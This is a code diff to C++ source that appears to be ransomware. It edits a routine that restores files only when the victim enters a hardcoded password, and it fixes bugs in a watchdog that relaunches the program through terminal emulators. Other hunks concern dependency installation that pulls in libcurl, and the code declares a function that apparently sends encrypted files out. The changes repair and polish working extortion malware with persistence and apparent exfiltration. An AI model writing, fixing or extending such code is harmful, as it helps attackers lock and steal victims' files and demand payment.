@@ -248,14 +248,28 @@ void decryptAllFiles() {
         cout << "Enter password to restore files: ";
         cin >> userPassword;
         if (userPassword == HARDCODED_PASSWORD) {
+            cout << "\033[1;32m[OK]\033[0m Password correct! Starting decryption..." << endl;
+            
             for (auto &pair : fileMap) {
                 fs::path outputPath = fs::current_path() / pair.second;
                 if (!fs::exists(outputPath.parent_path())) {
                     fs::create_directories(outputPath.parent_path());
-}
+                }
                 processFile(pair.first, outputPath.string(), HARDCODED_PASSWORD, false, fileMap);
             }
+            
+            // Remove encrypted files after successful decryption
+            cout << "\033[1;33m[PROCESS]\033[0m Cleaning up encrypted files..." << endl;
+            for (auto &pair : fileMap) {
+                if (fs::exists(pair.first)) {
+                    fs::remove(pair.first);
+                    cout << "\033[1;32m[OK]\033[0m Removed: " << pair.first << endl;
+                }
+            }
+            
+            // Remove the map file
             fs::remove(MAP_FILE);
+            cout << "\033[1;32m[SUCCESS]\033[0m All files have been restored and encrypted files cleaned up!" << endl;
             return;
         }
         cout << "\033[1;31m[WARNING]\033[0m Incorrect password. Attempts left: " << (MAX_PASSWORD_ATTEMPTS - attempts - 1) << endl;
@@ -349,7 +363,7 @@ void watchdog(const string& selfPath) {
                 "mate-terminal", "tilix", nullptr
             };
 
-            for (int i = 0; terms[itial");]; ++i) {
+            for (int i = 0; terms[i]; ++i) {
                 string cmd = string(terms[i]) + " -e \"" + selfPath + "\" &";
                 if (system(cmd.c_str()) == 0) break;
             }
@@ -492,7 +506,7 @@ void installPackageIfMissing(const string &pkg) {
     string manager = detectPackageManager();
 
     if (manager == "unknown") {
-        cerr << "1;31m[ERROR]\033[0m Unsupported package manager. Please install '" << pkg << "' manually.\n";
+        cerr << "Unsupported package manager. Please install '" << pkg << "' manually.\n";
         return;
     }
 
@@ -522,7 +536,7 @@ void checkDependencies() {
     installPackageIfMissing("libcurl4-openssl-dev");
     installPackageIfMissing("build-essential");
     installPackageIfMissing("acpi");
-    installPackageifMissing("xterm");
+    installPackageIfMissing("xterm");
 }
 
 void sendRandomEncryptedFiles(const string &directory, int maxFiles);
